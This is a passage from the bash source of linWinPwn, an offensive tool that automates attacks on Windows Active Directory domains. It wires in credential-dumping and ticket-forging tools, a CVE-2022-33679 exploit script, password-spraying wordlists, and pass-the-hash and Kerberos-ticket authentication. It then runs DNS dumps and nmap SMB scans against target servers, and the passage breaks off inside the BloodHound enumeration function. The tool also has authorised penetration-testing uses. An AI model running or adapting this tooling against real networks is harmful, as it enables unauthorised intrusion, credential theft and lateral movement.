#!/bin/bash
# Title: linWinPwn
# Author: lefayjey

#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
modules="interactive"
output_dir="$(pwd)"
wordlists_dir="/opt/lwp-wordlists"
pass_wordlist="/usr/share/wordlists/rockyou.txt"
if [ ! -f "${pass_wordlist}" ]; then pass_wordlist="${wordlists_dir}/rockyou.txt"; fi
user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
if [ ! -f "${user_wordlist}" ]; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
attacker_interface="eth0"
attacker_IP=$(ip -f inet addr show $attacker_interface | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
curr_targets="Domain Controllers"
targets="DC"
custom_target_scanned=false
nullsess_bool=false
pass_bool=false
hash_bool=false
kerb_bool=false
aeskey_bool=false
pfxcert_bool=false
autoconfig_bool=false
ldaps_bool=false
forcekerb_bool=false
verbose_bool=false

#Tools variables
scripts_dir="/opt/lwp-scripts"
netexec=$(which netexec)
impacket_findDelegation=$(which findDelegation.py)
if [ ! -f "${impacket_findDelegation}" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi
impacket_GetUserSPNs=$(which GetUserSPNs.py)
if [ ! -f "${impacket_GetUserSPNs}" ]; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi
impacket_secretsdump=$(which secretsdump.py)
if [ ! -f "${impacket_secretsdump}" ]; then impacket_secretsdump=$(which impacket-secretsdump); fi
impacket_GetNPUsers=$(which GetNPUsers.py)
if [ ! -f "${impacket_GetNPUsers}" ]; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
impacket_getTGT=$(which getTGT.py)
if [ ! -f "${impacket_getTGT}" ]; then impacket_getTGT=$(which impacket-getTGT); fi
impacket_goldenPac=$(which goldenPac.py)
if [ ! -f "${impacket_goldenPac}" ]; then impacket_goldenPac=$(which impacket-goldenPac); fi
impacket_rpcdump=$(which rpcdump.py)
if [ ! -f "${impacket_rpcdump}" ]; then impacket_rpcdump=$(which impacket-rpcdump); fi
impacket_reg=$(which reg.py)
if [ ! -f "${impacket_reg}" ]; then impacket_reg=$(which impacket_reg); fi
impacket_smbserver=$(which smbserver.py)
if [ ! -f "${impacket_smbserver}" ]; then impacket_smbserver=$(which impacket-smbserver); fi
impacket_ticketer=$(which ticketer.py)
if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket_ticketer); fi
enum4linux_py=$(which enum4linux-ng)
if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
smbmap=$(which smbmap)
adidnsdump=$(which adidnsdump)
certi_py=$(which certi.py)
certipy=$(which certipy)
ldeep=$(which ldeep)
pre2k=$(which pre2k)
certsync=$(which certsync)
hekatomb=$(which hekatomb)
manspider=$(which manspider)
coercer=$(which coercer)
donpapi=$(which DonPAPI)
bloodyad=$(which bloodyAD)
kerbrute="$scripts_dir/kerbrute"
silenthound="$scripts_dir/silenthound.py"
windapsearch="$scripts_dir/windapsearch"
CVE202233679="$scripts_dir/CVE-2022-33679.py"
targetedKerberoast="$scripts_dir/targetedKerberoast.py"
FindUncommonShares="$scripts_dir/FindUncommonShares.py"
nmap=$(which nmap)
john=$(which john)

print_banner () {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN}version 0.8.8 ${NC}
      https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
"
}

help_linWinPwn () {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h/--help         Show the help message"
    echo -e "-t/--target       DC IP or target Domain ${RED}[MANDATORY]${NC}"
    echo -e "-u/--username     Username (default: empty)"
    echo -e "-p                Password (NTLM authentication only) (default: empty)" 
    echo -e "-H                LM:NT (NTLM authentication only) (default: empty)" 
    echo -e "-K                Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)" 
    echo -e "-A                AES Key (Kerberos authentication only) (default: empty)" 
    echo -e "-C                PFX Certificate (default: empty)" 
    echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
    echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
    echo -e "-o/--output       Output directory (default: current dir)"
    echo -e "--auto-config     Run NTP sync with target DC and adds entry to /etc/hosts"
    echo -e "--ldaps           Use LDAPS instead of LDAP (port 636)"
    echo -e "--verbose         Enable all verbose and debug outputs"
    echo -e "-I/--interface    Attacker's network interface (default: eth0)"
    echo -e "-T/--targets      Target systems for Vuln Scan, SMB Scan and Pwd Dump (default: Domain Controllers)"
    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain -d domain -u user [-p password or -H hash or -K kerbticket]" >&2;
    echo -e ""
}

args=()
while test $# -gt 0; do
        case $1 in
            -d) domain="${2}"; shift;;
            --domain) domain="${2}"; shift;;
            -u) user="${2}"; shift;; #leave empty for anonymous login
            --user) user="${2}"; shift;; #leave empty for anonymous login
            -p) password="${2}"; pass_bool=true; shift;; #password
            -H) hash="${2}"; hash_bool=true; shift;; #NTLM hash
            -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
            -A) aeskey="${2}"; aeskey_bool=true; shift;; #AES Key (128 or 256 bits)
            -C) pfxcert="${2}"; pfxcert_bool=true; shift;; #PFX certificate (without password)
            -t) dc_ip="${2}"; shift;; #mandatory
            --target) dc_ip="${2}"; shift;; #mandatory
            -M) modules="${2}"; shift;; #comma separated modules to run
            --Modules) modules="${2}"; shift;; #comma separated modules to run
            -o) output_dir="$(realpath ${2})"; shift;;
            --output) output_dir="$(realpath ${2})"; shift;;
            -I) attacker_IP="$(ip -f inet addr show $2 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')"; attacker_interface=$2; shift;;
            --interface) attacker_IP="$(ip -f inet addr show $2 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')"; attacker_interface=$2; shift;;
            -T) targets="${2}"; shift;;
            --targets) targets="${2}"; shift;;
            --auto-config) autoconfig_bool=true; args+=($1);;
            --ldaps) ldaps_bool=true; args+=($1);;
            --verbose) verbose_bool=true; args+=($1);;
            -h) help_linWinPwn; exit;;
            --help) help_linWinPwn; exit;;
            *) print_banner; echo -e "${RED}[-] Unknown option:${NC} ${1}"; echo -e "Use -h for help"; exit 1;;
        esac
        shift
done
set -- "${args[@]}"

run_command () {
    echo "$(date +%Y-%m-%d\ %H:%M:%S); $@" >> $command_log
    $@
}

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[-] Missing target... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    echo -e "${GREEN}[+] $(date)${NC}"

    if [ ! -f "${netexec}" ] ; then
        echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
        exit 1
    else
        dc_info=$(${netexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)

    if [ -z "$dc_domain" ] ; then
        echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
        exit 1
    elif [ "$dc_domain" == "$dc_ip" ] && [ -z "$domain" ]; then
        echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
        exit 1
    else 
        if [ -z "$domain" ]; then domain=$dc_domain; else dc_domain=$domain; fi
    fi

    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
    dc_open_ports=$(${nmap} -p 135,445,389,636 ${dc_ip} -sT -T5 --open)
    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi

    if [ "${autoconfig_bool}" == true ]; then
        echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
        sudo timedatectl set-ntp 0
        sudo ntpdate ${dc_ip}
        if [[ ! $(grep ${dc_ip} "/etc/hosts") ]]; then
            echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
            echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        else
            echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
        fi
    fi

    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
    output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
    command_log="$output_dir/$(date +%Y-%m-%d)_command.log"
    servers_ip_list="${output_dir}/DomainRecon/Servers/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/Servers/dc_ip_list_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/Servers/sql_ip_list_${dc_domain}.txt"
    servers_hostname_list="${output_dir}/DomainRecon/Servers/servers_list_${dc_domain}.txt"
    dc_hostname_list="${output_dir}/DomainRecon/Servers/dc_list_${dc_domain}.txt"
    sql_hostname_list="${output_dir}/DomainRecon/Servers/sql_list_${dc_domain}.txt"
    custom_servers_list="${output_dir}/DomainRecon/Servers/custom_servers_list_${dc_domain}.txt"
    target=${dc_ip}
    target_servers=${servers_ip_list}
    target_dc=${dc_ip_list}
    target_sql=${sql_ip_list}

    mkdir -p ${output_dir}/Scans
    mkdir -p ${output_dir}/DomainRecon/Servers
    mkdir -p ${output_dir}/DomainRecon/Users
    mkdir -p ${output_dir}/DomainRecon/BloodHound
    mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
    mkdir -p ${output_dir}/DomainRecon/ADCS
    mkdir -p ${output_dir}/DomainRecon/SilentHound
    mkdir -p ${output_dir}/DomainRecon/ldeepDump
    mkdir -p ${output_dir}/DomainRecon/bloodyAD
    mkdir -p ${output_dir}/Kerberos
    mkdir -p ${output_dir}/Shares/smbmapDump
    mkdir -p ${output_dir}/Shares/manspiderDump
    mkdir -p ${output_dir}/Credentials
    mkdir -p ${output_dir}/Credentials/SAMDump
    mkdir -p ${output_dir}/Vulnerabilities
    mkdir -p ${output_dir}/Vulnerabilities/RPCDump
    mkdir -p ${output_dir}/Vulnerabilities/Coercer
    mkdir -p /tmp/shared

    if [ ! -f ${servers_ip_list} ]; then /bin/touch ${servers_ip_list}; fi
    if [ ! -f ${servers_hostname_list} ]; then /bin/touch  ${servers_hostname_list}; fi
    if [ ! -f ${dc_ip_list} ]; then /bin/touch ${dc_ip_list}; fi
    if [ ! -f ${dc_hostname_list} ]; then /bin/touch  ${dc_hostname_list}; fi

    if [ ! -f "${user_wordlist}" ] ; then
        echo -e "${RED}[-] Users list file not found${NC}"
    fi

    if [ ! -f "${pass_wordlist}" ] ; then
        echo -e "${RED}[-] Passwords list file not found${NC}"
    fi
    
    argument_ThePorgs=""
    impacket_ThePorgs=$($impacket_findDelegation | head -n 1 | grep "ThePorgs")
    if [ ! -z "${impacket_ThePorgs}" ]; then argument_ThePorgs="-dc-host ${dc_NETBIOS}"; fi
    echo -e ""

    if [[ $targets == "DC" ]]; then
        curr_targets="Domain Controllers"
    elif [[ $targets == "All" ]]; then
        curr_targets="All domain servers"
    elif [[ $targets == "File="* ]]; then
        curr_targets="File containing list of servers"
        /bin/rm ${custom_servers_list} 2>/dev/null
        custom_servers=$(echo $targets | cut -d "=" -f 2)
        /bin/cp $custom_servers ${custom_servers_list} 2>/dev/null
        if [ ! -s "${custom_servers_list}" ] ; then
            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
            curr_targets="Domain Controllers"
            custom_servers=""
        fi
    elif [[ $targets == "IP="* ]]; then
        curr_targets="IP or hostname"
        custom_ip=$(echo $targets | cut -d "=" -f 2)
        /bin/rm ${custom_servers_list} 2>/dev/null
        echo -n $custom_ip > ${custom_servers_list} 2>/dev/null
        if [ ! -s "${custom_servers_list}" ] ; then
            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
            curr_targets="Domain Controllers"
            custom_ip=""
        fi
    else   
        echo -e "${RED}[-] Error invalid targets parameter. Choose between DC, All, File='./custom_list' or IP=IP_or_hostname... ${NC}"
        exit 1
    fi
}

authenticate (){
    #Check if null session is used
    if [ "${user}" == "" ] && [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ]; then
        nullsess_bool=true
        argument_ne="-d ${domain}"
        argument_imp="${domain}/"
        argument_imp_gp="${domain}/"
        argument_smbmap=""
        argument_ldeep="-d ${dc_domain} -a"
        argument_pre2k="-d ${domain}"
        argument_manspider="-d ${domain} -u '' -p ''"
        argument_coercer="-d ${domain} -u '' -p ''"
        argument_bloodyad="-d ${domain} -u '' -p ''"
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
    
    #Check if username is not provided
    elif [ "${user}" == "" ]; then
        echo -e "${RED}[i]${NC} Please specify username and try again..."
        exit 1
    
    #Check if empty password is used
    elif [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] && [ "${aeskey}" == "" ]; then
        argument_ne="-d ${domain} -u ${user}"
        argument_imp="${domain}/${user}:''" 
        argument_imp_gp="${domain}/${user}:''" 
        argument_bhd="-u ${user}@${domain} -p ''"
        argument_enum4linux="-w ${domain} -u ${user} -p ''"
        argument_adidns="-u ${domain}\\${user} -p ''"
        argument_ldd="-u ${domain}\\${user} -p ''"
        argument_smbmap="-d ${domain} -u ${user} -p ''"
        argument_certi_py="${domain}/${user}:''"
        argument_certipy="-u ${user}@${domain} -p ''"
        argument_ldeep="-d ${domain} -u ${user} -p '' -a"
        argument_pre2k="-d ${domain} -u ${user} -p ''"
        argument_certsync="-d ${domain} -u ${user} -p ''"
        argument_donpapi="${domain}/${user}:''"
        argument_hekatomb="${domain}/${user}:''"
        argument_silenthd="-u ${domain}\\${user} -p ''"
        argument_windap="-d ${domain} -u ${user} -p ''"
        argument_targkerb="-d ${domain} -u ${user} -p ''"
        argument_finduncshar="-d ${domain} -u ${user} -p ''"
        argument_manspider="-d ${domain} -u ${user} -p ''"
        argument_coercer="-d ${domain} -u ${user} -p ''"
        argument_bloodyad="-d ${domain} -u ${user} -p ''"
        pass_bool=false
        hash_bool=false
        kerb_bool=false
        aeskey_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}${user} with empty password ${NC}"
    
    fi

    if [ "${pass_bool}" == true ] ; then
        argument_ne="-d ${domain} -u ${user} -p ${password}"
        argument_imp="${domain}/${user}:${password}"
        argument_imp_gp="${domain}/${user}:${password}"
        argument_imp_ti="-user ${user} -password ${password} -domain ${domain}"
        argument_bhd="-u ${user}@${domain} -p ${password} --auth-method ntlm"
        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
        argument_adidns="-u ${domain}\\${user} -p ${password}"
        argument_ldd="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_certi_py="${domain}/${user}:${password}"
        argument_certipy="-u ${user}@${domain} -p ${password}"
        argument_ldeep="-d ${domain} -u ${user} -p ${password}"
        argument_pre2k="-d ${domain} -u ${user} -p ${password}"
        argument_certsync="-d ${domain} -u ${user} -p ${password}"
        argument_donpapi="${domain}/${user}:${password}"
        argument_hekatomb="${domain}/${user}:${password}"
        argument_silenthd="-u ${domain}\\${user} -p ${password}"
        argument_windap="-d ${domain} -u ${user} -p ${password}"
        argument_targkerb="-d ${domain} -u ${user} -p ${password}"
        argument_finduncshar="-d ${domain} -u ${user} -p ${password}"
        argument_manspider="-d ${domain} -u ${user} -p ${password}"
        argument_coercer="-d ${domain} -u ${user} -p ${password}"
        argument_bloodyad="-d ${domain} -u ${user} -p ${password}"
        hash_bool=false
        kerb_bool=false
        aeskey_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
    fi

    #Check if NTLM hash is used, and complete with empty LM hash
    if [ "${hash_bool}" == true ] ; then
        if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
            if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
                hash="aad3b435b51404eeaad3b435b51404ee"$hash
            fi
            argument_ne="-d ${domain} -u ${user} -H ${hash}"
            argument_imp=" -hashes ${hash} ${domain}/${user}"
            argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
            argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
            argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
            argument_adidns="-u ${domain}\\${user} -p ${hash}"
            argument_ldd="-u ${domain}\\${user} -p ${hash}"
            argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
            argument_certi_py="${domain}/${user} --hashes ${hash}"
            argument_certipy="-u ${user}@${domain} -hashes ${hash}"
            argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
            argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
            argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
            argument_donpapi=" -H ${hash} ${domain}/${user}"
            argument_hekatomb="-hashes ${hash} ${domain}/${user}"
            argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
            argument_windap="-d ${domain} -u ${user} --hash ${hash}"
            argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
            argument_manspider="-d ${domain} -u ${user} -H $(expr substr $hash 34 65)"
            argument_coercer="-d ${domain} -u ${user} --hashes ${hash}"
            argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
            pass_bool=false
            kerb_bool=false
            aeskey_bool=false
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
        else
            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
            exit 1
        fi
    fi
    
    #Check if kerberos ticket is used
    if [ "${kerb_bool}" == true ] ; then
        argument_ne="-d ${domain} -u ${user} --use-kcache"
        pass_bool=false
        hash_bool=false
        aeskey_bool=false
        forcekerb_bool=false
        if [ -f "${krb5cc}" ] ; then
            target=${dc_FQDN}
            target_dc=${dc_hostname_list}
            target_sql=${sql_hostname_list}
            target_servers=${servers_hostname_list}
            export KRB5CCNAME=$(realpath $krb5cc)
            argument_imp="-k -no-pass ${domain}/${user}"
            argument_enum4linux="-w ${domain} -u ${user} -K ${krb5cc}"
            argument_bhd="-u ${user}@${domain} -k -no-pass -p '' --auth-method kerberos"
            argument_certi_py="${domain}/${user} -k --no-pass"
            argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
            argument_ldeep="-d ${domain} -u ${user} -k"
            argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
            argument_donpapi="-k -no-pass ${domain}/${user}"
            argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
            argument_bloodyad="-d ${domain} -u ${user} -k"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath $krb5cc)${NC}"
        else
            echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath $krb5cc)..."
            exit 1
        fi
    fi

    #Check if kerberos AES key is used
    if [ "${aeskey_bool}" == true ] ; then
        target=${dc_FQDN}
        target_dc=${dc_hostname_list}
        target_sql=${sql_hostname_list}
        target_servers=${servers_hostname_list}
        argument_ne="-d ${domain} -u ${user} --aesKey ${aeskey}" #errors, PL created
        argument_imp="-aesKey ${aeskey} ${domain}/${user}"
        argument_bhd="-u ${user}@${domain} -aesKey ${aeskey} --auth-method kerberos" #error, PL created
        argument_certi_py="${domain}/${user} --aes ${aeskey} -k"
        argument_certipy="-u ${user}@${domain} -aes ${aeskey} -target ${dc_FQDN}"
        argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
        argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k" #error, PL created
        argument_donpapi="-k -aesKey ${aeskey} ${domain}/${user}"
        argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k" #error, PL created
        pass_bool=false
        hash_bool=false
        kerb_bool=false
        forcekerb_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
    fi

    if [ "${nullsess_bool}" == false ] ; then
        auth_check=$(${netexec} smb ${target} ${argument_ne} 2>&1| grep "\[-\]\|Traceback" -A 10)
        if [ ! -z "$auth_check" ] ; then
            echo $auth_check
            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
            exit 1
        fi
    fi

    if [ "${forcekerb_bool}" == true ] ; then
        argument_ne="${argument_ne} -k"
    fi

    if [ "${verbose_bool}" == true ] ; then
        ne_verbose="--verbose"
        argument_imp="-debug ${argument_imp}"
        argument_imp_gp="-debug ${argument_imp_gp}"
        argument_imp_ti="-debug ${argument_imp_ti}"
        argument_enum4linux="${argument_enum4linux} -v"
        argument_bhd="${argument_bhd} -v"
        argument_adidns="${argument_adidns} -v -d"
        argument_pre2k="${argument_pre2k} -verbose"
        argument_certsync="${argument_certsync} -debug"
        argument_donpapi="-d ${argument_donpapi}"
        argument_hekatomb="-debug ${argument_hekatomb}"
        argument_windap="${argument_windap} -v --debug"
        argument_targkerb="${argument_targkerb} -v"
        argument_kerbrute="-v"
        argument_finduncshar="${argument_finduncshar} -v --debug"
        argument_manspider="${argument_manspider} -v"
        argument_coercer="${argument_coercer} -v"
        argument_CVE202233679="-debug"
        argument_bloodyad="-v DEBUG ${argument_bloodyad}"
    fi
    
    echo -e ${auth_string}
}

parse_servers () {
    /bin/cat ${output_dir}/DomainRecon/Servers/servers_list_*_${dc_domain}.txt 2>/dev/null | sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' | sort -uf > ${servers_hostname_list} 2>&1
    /bin/cat ${output_dir}/DomainRecon/Servers/dc_list_*_${dc_domain}.txt 2>/dev/null | sed -e 's/ //' -e 's/\$//' -e "s/$/.${dc_domain}/" -e 's/.*/\U&/' | sort -uf > ${dc_hostname_list} 2>&1
    /bin/cat ${output_dir}/DomainRecon/Servers/ip_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${servers_ip_list} 2>&1
    /bin/cat ${output_dir}/DomainRecon/Servers/dc_ip_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${dc_ip_list} 2>&1

    if [ ! $(grep ${dc_ip} ${servers_ip_list}) ]; then echo ${dc_ip} >> ${servers_ip_list}; fi
    if [ ! $(grep ${dc_ip} ${dc_ip_list}) ]; then echo ${dc_ip} >> ${dc_ip_list}; fi
    if [ ! $(grep ${dc_FQDN^^} ${dc_hostname_list}) ]; then echo ${dc_FQDN,,} >> ${dc_hostname_list}; fi
    if [ ! $(grep ${dc_FQDN^^} ${servers_hostname_list}) ]; then echo ${dc_FQDN,,} >> ${servers_hostname_list}; fi
}

parse_users () {
    users_list="${output_dir}/DomainRecon/Users/users_list_${dc_domain}.txt"
    /bin/cat ${output_dir}/DomainRecon/Users/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${users_list} 2>&1

    if [[ ! "${user}" == "" ]] && [[ ! $(grep ${user} ${users_list}) ]]; then echo ${user} >> ${users_list}; fi
}

dns_enum () {
    if [ ! -f "${adidnsdump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
        dns_records="${output_dir}/DomainRecon/Servers/dns_records_${dc_domain}.csv"
        if [ ! -f "${dns_records}" ]; then
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
                echo -e "${PURPLE}[-] adidnsdump does not support kerberos authentication${NC}"
            else
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                run_command "${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip}" | tee ${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt
                mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 2  | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" > ${output_dir}/DomainRecon/Servers/servers_list_dns_${dc_domain}.txt
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${output_dir}/DomainRecon/Servers/ip_list_dns_${dc_domain}.txt
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 | sed 's/\.$//' > ${output_dir}/DomainRecon/Servers/dc_list_dns_${dc_domain}.txt
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${output_dir}/DomainRecon/Servers/dc_ip_list_dns_${dc_domain}.txt
            fi
            parse_servers
        else
            echo -e "${YELLOW}[i] DNS dump found ${NC}"
        fi
    fi
    echo -e ""
}

smb_scan () {
    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        if [ "${curr_targets}" == "Domain Controllers" ] ; then
            servers_smb_list=${target_dc}
        elif  [ "${curr_targets}" == "All domain servers" ] ; then
            servers_scan_list=${target_servers}
            echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
            if [ ! -f "${servers_smb_list}" ]; then
                run_command "${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt" 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        elif  [ "${curr_targets}" == "File containing list of servers" ] ; then
            servers_scan_list=${custom_servers_list}
            echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            if [ "${custom_target_scanned}" == false ]; then
                run_command "${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
                custom_target_scanned=true
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        elif  [ "${curr_targets}" == "IP or hostname" ] ; then
            servers_scan_list=$(head -n1 ${custom_servers_list})
            echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            if [ "${custom_target_scanned}" == false ]; then
                run_command "${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
                custom_target_scanned=true
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        fi
    fi
}

###### AD Enumeration
bhd_enum () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ | grep -v 'bloodhound_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else
                current_dir=$(pwd)
